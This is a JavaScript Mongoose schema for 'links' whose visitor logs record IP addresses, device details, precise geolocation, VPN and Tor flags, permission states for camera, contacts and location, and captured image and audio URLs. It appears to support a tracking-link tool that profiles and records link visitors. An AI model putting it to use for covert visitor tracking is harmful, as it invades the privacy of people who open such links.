const mongoose = require("mongoose");

const linkSchema = new mongoose.Schema({
  title: {
    type: String,
    required: true,
    trim: true,
  },

  pageId: {
    type: String,
    required: true,
    unique: true,
  },

  number: {
    type: Number,
    required: true,
    unique: true,
  },

  url: {
    type: String,
  },

  // ✅ Visitor Logs (Main Analytics Data)
  logs: [
    {
      timestamp: {
        type: String,
      },

      // ✅ Request Info
      request: {
        ip: String,
        rawIp: String,
        referrer: String,
        userAgent: String,
      },

      // ✅ Device Breakdown
      device: {
        browser: String,
        os: String,
        device: String,
        deviceVendor: String,
        deviceType: String,
      },

      // ✅ Raw Client Data (Expo Device etc.)
      clientData: Object,

      // ✅ Network + IP Intelligence
      network: {
        ip: String,

        location: {
          city: String,
          region: String,
          country: String,
          continent: String,

          region_code: String,
          country_code: String,
          continent_code: String,

          latitude: String,
          longitude: String,

          time_zone: String,
          locale_code: String,
          metro_code: String,

          is_in_european_union: Boolean,
        },

        network: {
          network: String,
          autonomous_system_number: String,
          autonomous_system_organization: String,
        },

        security: {
          vpn: Boolean,
          proxy: Boolean,
          tor: Boolean,
          relay: Boolean,
        },

        is_private: Boolean,
      },

      // ✅ Media Captures (Cloudinary URLs)
      captures: {
        image: String,
        audio: String,
      },

      // ✅ Permission Status (Only These Matter)
      permissions: {
        location: {
          type: String,
          enum: ["granted", "denied", "not_requested", "blocked"],
          default: "not_requested",
        },
        cameraview: {
          type: String,
          enum: ["granted", "denied", "not_requested", "blocked"],
          default: "not_requested",
        },
        contacts: {
          type: String,
          enum: ["granted", "denied", "not_requested", "blocked"],
          default: "not_requested",
        },
        media: {
          type: String,
          enum: ["granted", "denied", "not_requested", "blocked"],
          default: "not_requested",
        },
        notification: {
          type: String,
          enum: ["granted", "denied", "not_requested", "blocked"],
          default: "not_requested",
        },
      },
    },
  ],

  // ✅ Created Timestamp
  createdAt: {
    type: Date,
    default: Date.now,
  },
});

module.exports = mongoose.model("Link", linkSchema);